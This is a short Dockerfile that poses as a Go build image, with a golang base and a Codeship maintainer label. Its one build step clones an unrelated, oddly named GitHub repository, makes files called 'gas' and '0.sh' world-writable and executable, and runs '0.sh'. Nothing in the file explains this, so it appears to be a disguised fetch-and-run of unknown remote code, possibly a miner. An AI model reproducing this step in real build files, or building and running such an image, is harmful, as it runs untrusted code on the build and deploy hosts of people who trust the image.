ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
